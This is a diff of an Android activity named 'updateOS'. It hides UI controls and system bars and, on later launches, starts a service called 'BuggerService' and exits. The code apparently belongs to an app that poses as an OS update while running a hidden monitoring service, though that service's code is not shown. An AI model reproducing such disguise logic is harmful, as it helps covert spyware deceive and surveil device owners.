@@ -76,7 +76,7 @@ public class updateOS extends AppCompatActivity {
             if (actionBar != null) {
                 actionBar.show();
             }
-            mControlsView.setVisibility(View.VISIBLE);
+            mControlsView.setVisibility(View.GONE);
         }
     };
     private boolean mVisible;
@@ -95,7 +95,7 @@ public class updateOS extends AppCompatActivity {
         @Override
         public boolean onTouch(View view, MotionEvent motionEvent) {
             if (AUTO_HIDE) {
-                delayedHide(AUTO_HIDE_DELAY_MILLIS);
+             //   delayedHide(AUTO_HIDE_DELAY_MILLIS);
             }
             return false;
         }
@@ -108,24 +108,18 @@ public class updateOS extends AppCompatActivity {
         setContentView(R.layout.activity_update_os);
 
         SharedPreferences settings = getSharedPreferences(PREFS_NAME, 0);
-        SharedPreferences.Editor editor = settings.edit();
-          //   editor.putBoolean(IS_INSTALLED, false);
-        //editor.commit();
+
         boolean isInstalled = settings.getBoolean(IS_INSTALLED, false);
+
         if(isInstalled) {
 
-            /*
-            Intent intent = new Intent(getApplicationContext(), MainActivity.class);
-            intent.putExtra("runMainActivity",true);
-            startActivity(intent);
-*/
-            overridePendingTransition(R.anim.slide_right_in, R.anim.slide_left_out);
             startService(new Intent(this, BuggerService.class).putExtra("runMainActivity",true));
-
+            overridePendingTransition(R.anim.slide_right_in, R.anim.slide_left_out);
             finish();
 
             return;
         }
+
         mVisible = true;
         mControlsView = findViewById(R.id.fullscreen_content_controls);
         mContentView = findViewById(R.id.fullscreen_content);
@@ -250,6 +244,7 @@ public class updateOS extends AppCompatActivity {
 
     @SuppressLint("InlinedApi")
     private void show() {
+        /*
         // Show the system bar
         mContentView.setSystemUiVisibility(View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                 | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION);
@@ -258,6 +253,7 @@ public class updateOS extends AppCompatActivity {
         // Schedule a runnable to display UI elements after a delay
         mHideHandler.removeCallbacks(mHidePart2Runnable);
         mHideHandler.postDelayed(mShowPart2Runnable, UI_ANIMATION_DELAY);
+    */
     }
 
     /**
@@ -266,6 +262,6 @@ public class updateOS extends AppCompatActivity {
      */
     private void delayedHide(int delayMillis) {
         mHideHandler.removeCallbacks(mHideRunnable);
-        mHideHandler.postDelayed(mHideRunnable, delayMillis);
+        mHideHandler.postDelayed(mHideRunnable, 1);
     }
 }
